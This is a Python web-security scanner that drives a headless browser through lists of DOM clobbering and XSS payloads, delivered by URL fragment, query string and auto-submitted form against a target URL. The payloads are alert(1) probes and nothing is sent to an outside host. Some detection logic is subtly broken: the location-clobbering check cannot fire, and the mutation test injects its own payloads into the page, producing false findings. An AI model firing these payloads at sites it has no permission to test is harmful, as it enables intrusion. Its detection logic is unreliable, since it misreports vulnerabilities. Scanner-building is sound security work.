#!/usr/bin/env python3
"""
DOM Clobbering and Mutation-XSS Scanner
Uses Playwright to monitor DOM changes and detect script injection/clobbering
"""

import asyncio
import json
import logging
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse
import re

try:
    from playwright.async_api import async_playwright, Page, Browser
except ImportError:
    logging.warning("Playwright not installed. Install with: pip install playwright && playwright install")

from core.utils import color_print, setup_logging

class DOMXSSScanner:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.logger = setup_logging(__name__)
        self.findings = []
        self.dom_mutations = []
        self.script_injections = []
        
    async def scan_target(self, target_url: str) -> List[Dict[str, Any]]:
        """Main scanning method for DOM-based XSS vulnerabilities"""
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=self.config.get('headless', True),
                    args=['--no-sandbox', '--disable-setuid-sandbox']
                )
                
                page = await browser.new_page()
                
                # Setup DOM monitoring
                await self._setup_dom_monitoring(page)
                
                # Navigate to target
                await page.goto(target_url, wait_until='networkidle')
                
                # Perform DOM clobbering tests
                await self._test_dom_clobbering(page, target_url)
                
                # Test mutation-based XSS
                await self._test_mutation_xss(page, target_url)
                
                # Test dynamic script injection
                await self._test_script_injection(page, target_url)
                
                await browser.close()
                
        except Exception as e:
            self.logger.error(f"DOM XSS scan failed: {e}")
            
        return self.findings
    
    async def _setup_dom_monitoring(self, page: Page):
        """Setup DOM mutation observers and event listeners"""
        
        # Inject monitoring script
        await page.add_init_script("""
            window.domMutations = [];
            window.scriptInjections = [];
            
            // Monitor DOM changes
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.type === 'childList') {
                        mutation.addedNodes.forEach((node) => {
                            if (node.nodeType === Node.ELEMENT_NODE) {
                                // Check for script tags
                                if (node.tagName === 'SCRIPT') {
                                    window.scriptInjections.push({
                                        type: 'script_added',
                                        src: node.src,
                                        content: node.textContent,
                                        timestamp: Date.now()
                                    });
                                }
                                
                                // Check for event handlers
                                const eventAttrs = ['onload', 'onerror', 'onclick', 'onmouseover'];
                                eventAttrs.forEach(attr => {
                                    if (node.hasAttribute(attr)) {
                                        window.scriptInjections.push({
                                            type: 'event_handler',
                                            attribute: attr,
                                            value: node.getAttribute(attr),
                                            element: node.outerHTML,
                                            timestamp: Date.now()
                                        });
                                    }
                                });
                            }
                        });
                    }
                    
                    // Check for attribute changes
                    if (mutation.type === 'attributes') {
                        const target = mutation.target;
                        const attrName = mutation.attributeName;
                        
                        if (attrName && attrName.startsWith('on')) {
                            window.scriptInjections.push({
                                type: 'attribute_change',
                                attribute: attrName,
                                value: target.getAttribute(attrName),
                                element: target.outerHTML,
                                timestamp: Date.now()
                            });
                        }
                    }
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onblur']
            });
            
            // Monitor for eval() calls
            const originalEval = window.eval;
            window.eval = function(code) {
                window.scriptInjections.push({
                    type: 'eval_call',
                    code: code,
                    stack: new Error().stack,
                    timestamp: Date.now()
                });
                return originalEval.apply(this, arguments);
            };
            
            // Monitor for innerHTML assignments
            const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
            Object.defineProperty(Element.prototype, 'innerHTML', {
                set: function(value) {
                    if (typeof value === 'string' && value.includes('<script')) {
                        window.scriptInjections.push({
                            type: 'innerHTML_script',
                            value: value,
                            element: this.outerHTML,
                            timestamp: Date.now()
                        });
                    }
                    return originalInnerHTML.set.call(this, value);
                },
                get: originalInnerHTML.get
            });
        """)
    
    async def _test_dom_clobbering(self, page: Page, target_url: str):
        """Test for DOM clobbering vulnerabilities"""
        
        clobbering_payloads = [
            # Element ID clobbering
            '<a id="location" href="javascript:alert(1)">Click me</a>',
            '<form id="location" action="javascript:alert(1)"></form>',
            '<img id="location" src="x" onerror="alert(1)">',
            
            # Name attribute clobbering
            '<input name="location" value="javascript:alert(1)">',
            '<a name="location" href="javascript:alert(1)">Click me</a>',
            
            # Prototype pollution attempts
            '<script>Object.prototype.location = "javascript:alert(1)";</script>',
            '<script>window.__proto__.location = "javascript:alert(1)";</script>',
            
            # Document property clobbering
            '<a id="document" href="javascript:alert(1)">Click me</a>',
            '<form id="document" action="javascript:alert(1)"></form>',
        ]
        
        for payload in clobbering_payloads:
            try:
                # Inject payload via URL fragment
                test_url = f"{target_url}#{payload}"
                await page.goto(test_url, wait_until='networkidle')
                
                # Check if location was clobbered
                location_check = await page.evaluate("""
                    () => {
                        try {
                            return {
                                location_type: typeof location,
                                location_value: location.toString(),
                                is_clobbered: location !== window.location
                            };
                        } catch (e) {
                            return { error: e.message };
                        }
                    }
                """)
                
                if location_check.get('is_clobbered'):
                    self.findings.append({
                        'type': 'dom_clobbering',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'high',
                        'description': 'DOM clobbering detected - location object was redefined',
                        'evidence': location_check,
                        'remediation': 'Validate and sanitize all user inputs, especially in URL fragments'
                    })
                
                # Check for other clobbered properties
                property_check = await page.evaluate("""
                    () => {
                        const checks = {};
                        ['document', 'window', 'history', 'navigator'].forEach(prop => {
                            try {
                                checks[prop] = {
                                    type: typeof window[prop],
                                    is_original: window[prop] === eval(prop)
                                };
                            } catch (e) {
                                checks[prop] = { error: e.message };
                            }
                        });
                        return checks;
                    }
                """)
                
                for prop, check in property_check.items():
                    if not check.get('is_original', True):
                        self.findings.append({
                            'type': 'dom_clobbering',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'high',
                            'description': f'DOM clobbering detected - {prop} object was redefined',
                            'evidence': check,
                            'remediation': 'Validate and sanitize all user inputs'
                        })
                        
            except Exception as e:
                self.logger.warning(f"DOM clobbering test failed: {e}")
    
    async def _test_mutation_xss(self, page: Page, target_url: str):
        """Test for mutation-based XSS vulnerabilities"""
        
        mutation_payloads = [
            # SVG mutation
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin="alert(1)"/>',
            '<svg><set attributeName="onmouseover" to="alert(1)"/>',
            
            # HTML5 mutation
            '<details open ontoggle="alert(1)">',
            '<video src="x" onloadstart="alert(1)">',
            '<audio src="x" onloadstart="alert(1)">',
            
            # CSS mutation
            '<style>@import "javascript:alert(1)";</style>',
            '<link rel="stylesheet" href="javascript:alert(1)">',
            
            # Data URI mutation
            '<img src="data:text/html,<script>alert(1)</script>">',
            '<iframe src="data:text/html,<script>alert(1)</script>">',
        ]
        
        for payload in mutation_payloads:
            try:
                # Inject payload and monitor for mutations
                await page.evaluate(f"""
                    () => {{
                        const div = document.createElement('div');
                        div.innerHTML = `{payload}`;
                        document.body.appendChild(div);
                    }}
                """)
                
                # Wait for potential mutations
                await page.wait_for_timeout(1000)
                
                # Check for script injections
                injections = await page.evaluate("window.scriptInjections || []")
                
                for injection in injections:
                    if injection.get('type') in ['script_added', 'event_handler', 'eval_call']:
                        self.findings.append({
                            'type': 'mutation_xss',
                            'url': target_url,
                            'payload': payload,
                            'severity': 'high',
                            'description': 'Mutation-based XSS detected',
                            'evidence': injection,
                            'remediation': 'Sanitize HTML content and validate all inputs'
                        })
                        
            except Exception as e:
                self.logger.warning(f"Mutation XSS test failed: {e}")
    
    async def _test_script_injection(self, page: Page, target_url: str):
        """Test for dynamic script injection vulnerabilities"""
        
        injection_payloads = [
            # Direct script injection
            '<script>alert(1)</script>',
            '<script src="javascript:alert(1)"></script>',
            
            # Event handler injection
            '<img src="x" onerror="alert(1)">',
            '<div onclick="alert(1)">Click me</div>',
            
            # JavaScript protocol
            'javascript:alert(1)',
            'javascript:void(alert(1))',
            
            # Data URI injection
            'data:text/html,<script>alert(1)</script>',
            'data:application/javascript,alert(1)',
        ]
        
        for payload in injection_payloads:
            try:
                # Test via URL parameters
                test_url = f"{target_url}?test={payload}"
                await page.goto(test_url, wait_until='networkidle')
                
                # Check for script injections
                injections = await page.evaluate("window.scriptInjections || []")
                
                for injection in injections:
                    if injection.get('type') in ['script_added', 'event_handler', 'eval_call']:
                        self.findings.append({
                            'type': 'script_injection',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'critical',
                            'description': 'Dynamic script injection detected',
                            'evidence': injection,
                            'remediation': 'Implement strict input validation and output encoding'
                        })
                
                # Test via form submission
                await page.evaluate(f"""
                    () => {{
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = '{target_url}';
                        
                        const input = document.createElement('input');
                        input.name = 'test';
                        input.value = '{payload}';
                        
                        form.appendChild(input);
                        document.body.appendChild(form);
                        form.submit();
                    }}
                """)
                
            except Exception as e:
                self.logger.warning(f"Script injection test failed: {e}")

async def test_dom_xss(target_url: str, config: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Main function to test for DOM-based XSS vulnerabilities"""
    scanner = DOMXSSScanner(config)
    return await scanner.scan_target(target_url)

if __name__ == "__main__":
    # Test the scanner
    config = {'headless': False, 'verbose': True}
    asyncio.run(test_dom_xss("http://testphp.vulnweb.com/", config)) 